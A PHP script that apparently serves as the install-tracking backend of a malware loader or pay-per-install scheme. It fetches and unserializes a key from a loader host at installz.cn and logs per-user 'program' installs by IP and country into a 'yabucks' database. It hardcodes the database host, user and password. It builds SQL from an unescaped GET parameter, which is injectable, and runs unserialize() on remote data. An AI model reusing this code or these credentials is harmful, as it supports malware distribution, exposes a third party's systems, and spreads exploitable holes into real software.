<?php
if (!($uid = @$_REQUEST['uid'])) die();

$config = array(	
	'host' => '74.54.241.116',
	'user' => 'yabucks',
	'pass' => '03hsdSoN',
	'db'   => 'yabucks');
	
$conn = @mysql_connect($config['host'], $config['user'], $config['pass']) or die(mysql_error());
        @mysql_select_db($config['db'], $conn) or die(mysql_error($conn));
        
$content = file_get_contents('http://installz.cn/loaders/xor');
$options = unserialize($content);

$uid = _encrypt($uid, $options['xor']);        

$sql = 'SELECT * FROM `users` WHERE uid = \''.$uid.'\'';
if (mysql_num_rows(($statement = mysql_query($sql, $conn)))) {// exist case
    $user = mysql_fetch_array($statement, MYSQL_ASSOC);
    if ($user['is_active']) { // active case
         $_SERVER['REMOTE_ADDR'] = '209.222.78.162';	     
        require_once('lib/Geoip/geoip.inc');
        $gi = geoip_open("lib/Geoip/GeoIP.dat", GEOIP_STANDARD);
        $country = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);
        $code    = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);        
            
        $programs = explode('^', @$_GET['pcodes']);
        for ($i = 0, $count = count($programs); $i < $count; $i++) {
            list($undef, $program) = explode('_', $programs[$i]);
            if (!$program) continue;
            $values = array(
	            'program' => $program,
                'date'    => date('Y-m-d'),
                'ip'      => $_SERVER['REMOTE_ADDR'],
                'country' => $country?$country:'Unknown',
                'code'    => $code?$code:'UNKN',
                'value'   => 1);
                
            $sql = 'SELECT `id`, `value` FROM `programs-stat`
				WHERE 
					`program` = \''.$program.'\' AND
					`ip` =  \''.$values['ip'].'\' AND
					`date` = \''.$values['date'].'\'';                        
            $statement = mysql_query($sql, $conn) or die(mysql_error($conn));
            
            if (($row = mysql_fetch_array($statement, MYSQL_ASSOC))) {
                $values['value'] += $row['value'];
                $sql = 'UPDATE `programs-stat` SET';                            
            } else
                $sql = 'INSERT INTO `programs-stat` SET';            
                
            foreach ($values as $key => $value) {
                $sql .= '`'.$key.'` = \''.addslashes($value).'\', ';   	  	      	
            }
            $sql = substr($sql, 0, strlen($sql)-2);
            mysql_query($sql, $conn) or die(mysql_error($conn));
        }
        die(); 
    } else die(); // disabled case
}
?>